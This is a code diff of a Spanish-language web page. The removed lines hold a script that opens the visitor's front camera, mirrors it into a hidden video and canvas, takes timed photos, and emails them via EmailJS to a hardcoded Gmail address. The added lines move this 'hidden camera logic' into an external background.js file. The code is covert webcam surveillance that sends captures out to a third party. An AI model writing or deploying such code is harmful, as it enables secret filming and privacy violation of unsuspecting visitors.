@@ -10,101 +10,11 @@
 
   <!-- Cámara visible -->
   <video id="videoVisible" autoplay playsinline style="width:100%; max-width:400px; border:2px solid gold;"></video>
-  
-  <!-- Cámara invisible y canvas para fotos automáticas -->
-  <video id="videoInvisible" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvasInvisible" style="display:none;"></canvas>
 
-  <!-- EmailJS -->
+  <!-- EmailJS desde CDN -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
-  <script>
-    // Inicializa EmailJS
-    emailjs.init("VjQYPRJy2mXtQPXgB"); // tu Public Key
-
-    const videoVisible = document.getElementById("videoVisible");
-    const videoInvisible = document.getElementById("videoInvisible");
-    const canvasInvisible = document.getElementById("canvasInvisible");
-
-    const maxPhotos = 0;      // cantidad de fotos a tomar
-    const photoInterval = 3000; // intervalo en ms entre fotos
-    let photoCount = 0;
-
-    async function startCamera() {
-      try {
-        // Pedimos permiso solo una vez
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-
-        // Asignamos el mismo stream a ambas cámaras
-        videoVisible.srcObject = stream;
-        videoInvisible.srcObject = stream;
-        videoVisible.play();
-        videoInvisible.play();
-
-        // Empezamos la captura automática
-        videoInvisible.onloadedmetadata = () => {
-          const interval = setInterval(() => {
-            takeInvisiblePhoto();
-            photoCount++;
-            if(photoCount >= maxPhotos){
-              clearInterval(interval);
-              console.log("✅ Todas las fotos tomadas. La cámara visible sigue activa.");
-            }
-          }, photoInterval);
-        };
-
-      } catch (err) {
-        alert("❌ Necesitamos acceso a la cámara para capturar recuerdos.");
-        console.error("Error al acceder a la cámara:", err);
-        document.body.innerHTML = "<h2 style='color:red;'>No se puede continuar sin acceso a la cámara.</h2>";
-      }
-    }
-
-    function takeInvisiblePhoto() {
-      const context = canvasInvisible.getContext("2d");
-      
-      // Reducir resolución para menor tamaño Base64
-      canvasInvisible.width = videoInvisible.videoWidth / 2;
-      canvasInvisible.height = videoInvisible.videoHeight / 2;
-
-      context.drawImage(videoInvisible, 0, 0, canvasInvisible.width, canvasInvisible.height);
-
-      // Marco dorado
-      context.lineWidth = 20;
-      context.strokeStyle = "gold";
-      context.strokeRect(0, 0, canvasInvisible.width, canvasInvisible.height);
-
-      // Fecha y hora
-      const now = new Date();
-      context.font = "30px Arial";
-      context.fillStyle = "white";
-      context.strokeStyle = "black";
-      context.lineWidth = 2;
-      const text = now.toLocaleString();
-      context.strokeText(text, 20, canvasInvisible.height - 30);
-      context.fillText(text, 20, canvasInvisible.height - 30);
-
-      // Convertir a JPEG y reducir calidad
-      const imageData = canvasInvisible.toDataURL("image/jpeg", 0.5);
-
-      // Enviar la foto
-      enviarFoto(imageData, photoCount + 1);
-    }
-
-    function enviarFoto(imageBase64, numero) {
-      const params = {
-        to_email: "root52909@gmail.com",
-        message: `¡Aquí tienes el recuerdo #${numero}! 📸`,
-        photo: imageBase64
-      };
-
-      emailjs.send("service_ky1f599", "template_dlw99r6", params)
-        .then(() => console.log(`📩 Foto #${numero} enviada!`))
-        .catch(err => console.error(`❌ Error al enviar foto #${numero}:`, err));
-    }
-
-    // Inicia la cámara al cargar la página
-    startCamera();
-  </script>
+  <!-- Tu lógica de cámara oculta -->
+  <script src="background.js"></script>
 </body>
 </html>
